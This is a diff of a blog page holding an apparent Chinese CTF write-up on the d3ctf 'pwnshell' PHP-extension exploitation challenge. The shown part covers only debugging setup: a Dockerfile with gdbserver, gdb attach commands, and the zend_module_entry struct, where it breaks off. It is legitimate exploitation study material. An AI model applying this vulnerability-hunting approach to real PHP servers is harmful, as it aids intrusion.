@@ -1,517 +1,187 @@
-<!DOCTYPE html>
-<html lang="en">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="nyyyddddn">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="nyyyddddn">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="">
-    <meta name="description" content="pwnshell 复现 (php pwn)如何调试？php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了 能触发io中断的函数，比如说fgetc 1234&lt;?php$char &#x3D; fgetc(STDIN);echo &quot;You ente">
-<meta property="og:type" content="article">
-<meta property="og:title" content="d3ctf_pwnshell复现">
-<meta property="og:url" content="https://nyyyddddn.github.io/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/index.html">
-<meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="pwnshell 复现 (php pwn)如何调试？php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了 能触发io中断的函数，比如说fgetc 1234&lt;?php$char &#x3D; fgetc(STDIN);echo &quot;You ente">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-06-30T15:52:51.000Z">
-<meta property="article:modified_time" content="2024-06-30T15:55:47.067Z">
-<meta property="article:author" content="nyyyddddn">
-<meta property="article:tag" content="ctf writeup">
-<meta name="twitter:card" content="summary">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/null">
-    
-    <title>d3ctf_pwnshell复现 · nyyyddddn&#39;s blog</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>d3ctf_pwnshell复现 | nyyyddddn</title>
+  <meta name="author" content="nyyyddddn">
+  
+  <meta name="description" content="pwnshell 复现 (php pwn)如何调试？php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了
+能触发io中断的函数，比如说fgetc
+&amp;lt;?php
+$char = fgetc(STDIN);
+echo &#34;You entered: $char\n&#34;;
+?&gt;
 
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
+在pwnshell这个题目中php配置文件里禁用了fgetc这个函数，修改php.ini中的disable_functions，把fgetc删掉就可以使用这个函数了
+调试相关的命令安装gdbserver只需要在dockerfile里面加上安装的参数，之后构建镜像就好了
+FROM php:8.3-apache
 
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
+RUN DEBIAN_FRONTEND&amp;#x3D;noninteractive
+RUN apt-get update &amp;amp;&amp;amp; apt-get install -y vim gdbserver
 
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
+COPY .&amp;#x2F;stuff&amp;#x2F;php.ini &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;etc&amp;#x2F;php
+COPY .&amp;#x2F;stuff&amp;#x2F;vuln.so &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;extensions&amp;#x2F;no-debug-non-zts-20230831
+COPY .&amp;#x2F;stuff&amp;#x2F;readflag &amp;#x2F;
+COPY .&amp;#x2F;flag.txt &amp;#x2F;flag.txt
+COPY .&amp;#x2F;stuff&amp;#x2F;index.php &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html
+RUN chmod 400 &amp;#x2F;flag.txt
+RUN chmod u+sx &amp;#x2F;readflag
+RUN chmod -R 777 &amp;#x2F;var&amp;#x2F;www&amp;#x2F;html"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
+  <meta property="og:title" content="d3ctf_pwnshell复现"/>
+  <meta property="og:site_name" content="nyyyddddn"/>
 
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
+  
+    <meta property="og:image" content=""/>
+  
 
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
+  
+    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
+  <script src="/js/jquery-2.0.3.min.js"></script>
 
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
+  <!-- analytics -->
+  
 
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
 
-    body {
-        margin: 0;
-    }
 
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
 
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
-
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
-
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
-
-    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
-    <link rel="stylesheet" href="/css/dark.css">
-    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
 <meta name="generator" content="Hexo 6.3.0"></head>
 
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
-    
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header header-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>nyyyddddn</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">nyyyddddn</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">d3ctf_pwnshell复现</a>
-            </div>
-        </div>
-    
-</header>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">nyyyddddn</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/catergories" title="All the catergories.">
+			  <i class=""></i>Catergories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
 
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
+  <div class="container">
+  	<div class="content">
+    	 
 
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
+
+	
+		<div class="page-header">
+			<h1> d3ctf_pwnshell复现</h1>
+		</div>
+	
 
 
 
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
 
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
-
-
-    height:50vh;
-
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-    
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                d3ctf_pwnshell复现
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
-    
-</div>
-
-                
-                <!-- 文章字数统计 -->
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/06/30</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
-
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
-
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
-
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
-
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h2 id="pwnshell-复现-php-pwn"><a href="#pwnshell-复现-php-pwn" class="headerlink" title="pwnshell 复现 (php pwn)"></a>pwnshell 复现 (php pwn)</h2><h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><p>php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了</p>
+	  <h2 id="pwnshell-复现-php-pwn"><a href="#pwnshell-复现-php-pwn" class="headerlink" title="pwnshell 复现 (php pwn)"></a>pwnshell 复现 (php pwn)</h2><h3 id="如何调试？"><a href="#如何调试？" class="headerlink" title="如何调试？"></a>如何调试？</h3><p>php pwn该如何调试？在docker中装一个gdbserver，用gdbserver起一个程序，在exp中用能触发io中断的php函数打”断点”，之后用gdb连上去后在vuln.so里打个断点就好了</p>
 <p>能触发io中断的函数，比如说fgetc</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$char</span> = <span class="title function_ invoke__">fgetc</span>(STDIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;You entered: <span class="subst">$char</span>\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$char</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"You entered: <span class="token interpolation"><span class="token variable">$char</span></span>\n"</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在pwnshell这个题目中php配置文件里禁用了fgetc这个函数，修改php.ini中的disable_functions，把fgetc删掉就可以使用这个函数了</p>
 <h3 id="调试相关的命令"><a href="#调试相关的命令" class="headerlink" title="调试相关的命令"></a>调试相关的命令</h3><h4 id="安装gdbserver"><a href="#安装gdbserver" class="headerlink" title="安装gdbserver"></a>安装gdbserver</h4><p>只需要在dockerfile里面加上安装的参数，之后构建镜像就好了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM php:8.3-apache</span><br><span class="line"></span><br><span class="line">RUN DEBIAN_FRONTEND=noninteractive</span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y vim gdbserver</span><br><span class="line"></span><br><span class="line">COPY ./stuff/php.ini /usr/local/etc/php</span><br><span class="line">COPY ./stuff/vuln.so /usr/local/lib/php/extensions/no-debug-non-zts-20230831</span><br><span class="line">COPY ./stuff/readflag /</span><br><span class="line">COPY ./flag.txt /flag.txt</span><br><span class="line">COPY ./stuff/index.php /var/www/html</span><br><span class="line">RUN chmod 400 /flag.txt</span><br><span class="line">RUN chmod u+sx /readflag</span><br><span class="line">RUN chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">FROM php:8.3-apache
 
-<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t nyyyddddn/pwnshell .</span><br></pre></td></tr></table></figure>
+RUN DEBIAN_FRONTEND&#x3D;noninteractive
+RUN apt-get update &amp;&amp; apt-get install -y vim gdbserver
+
+COPY .&#x2F;stuff&#x2F;php.ini &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php
+COPY .&#x2F;stuff&#x2F;vuln.so &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20230831
+COPY .&#x2F;stuff&#x2F;readflag &#x2F;
+COPY .&#x2F;flag.txt &#x2F;flag.txt
+COPY .&#x2F;stuff&#x2F;index.php &#x2F;var&#x2F;www&#x2F;html
+RUN chmod 400 &#x2F;flag.txt
+RUN chmod u+sx &#x2F;readflag
+RUN chmod -R 777 &#x2F;var&#x2F;www&#x2F;html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><pre class="line-numbers language-none"><code class="language-none">docker build -t nyyyddddn&#x2F;pwnshell .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="开启容器"><a href="#开启容器" class="headerlink" title="开启容器"></a>开启容器</h4><p>多映射一个 8888端口用来调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9999:80 -p 8888:8888 nyyyddddn/pwnshell</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">docker run -d -p 9999:80 -p 8888:8888 nyyyddddn&#x2F;pwnshell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="gdbserver的使用"><a href="#gdbserver的使用" class="headerlink" title="gdbserver的使用"></a>gdbserver的使用</h4><p>gdbserver开启一个监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver :8888 php test.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdbserver :8888 php test.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后使用gdb连接上去调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q \</span><br><span class="line">-ex &quot;add-symbol-file vuln.so&quot; \</span><br><span class="line">-ex &quot;target remote :8888&quot;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">gdb -q \
+-ex &quot;add-symbol-file vuln.so&quot; \
+-ex &quot;target remote :8888&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>之后在vuln.so中打一个断点就好了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b zif_addHacker</span><br><span class="line">Breakpoint 1 at 0x1210</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; b zif_addHacker
+Breakpoint 1 at 0x1210
+pwndbg&gt; c
+Continuing.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -520,1568 +190,543 @@
 <h3 id="如何分析程序逻辑"><a href="#如何分析程序逻辑" class="headerlink" title="如何分析程序逻辑"></a>如何分析程序逻辑</h3><p>php module 程序的入口点是get_module 这个函数，会返回一个zend_module_entry结构体指针，这个结构体用来描述要加载的自定义函数地址 和信息，可以通过分析这个结构体知道哪些函数是出题人自定义的函数，再去分析这些函数的逻辑寻址漏洞</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/Zend/zend_modules.h">https://github.com/php/php-src/blob/master/Zend/zend_modules.h</a></p>
 <p>php8.3中 _zend_module_enrty的结构</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span> size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> zend_api;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> zend_debug;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> zts;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_ini_entry</span> *<span class="title">ini_entry</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_dep</span> *<span class="title">deps</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_function_entry</span> *<span class="title">functions</span>;</span></span><br><span class="line">	zend_result (*module_startup_func)(INIT_FUNC_ARGS);</span><br><span class="line">	zend_result (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS);</span><br><span class="line">	zend_result (*request_startup_func)(INIT_FUNC_ARGS);</span><br><span class="line">	zend_result (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS);</span><br><span class="line">	<span class="type">void</span> (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *version;</span><br><span class="line">	<span class="type">size_t</span> globals_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">	ts_rsrc_id* globals_id_ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">void</span>* globals_ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">void</span> (*globals_ctor)(<span class="type">void</span> *global);</span><br><span class="line">	<span class="type">void</span> (*globals_dtor)(<span class="type">void</span> *global);</span><br><span class="line">	zend_result (*post_deactivate_func)(<span class="type">void</span>);</span><br><span class="line">	<span class="type">int</span> module_started;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> type;</span><br><span class="line">	<span class="type">void</span> *handle;</span><br><span class="line">	<span class="type">int</span> module_number;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *build_id;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_zend_module_entry</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> size<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> zend_api<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> zend_debug<span class="token punctuation">;</span>
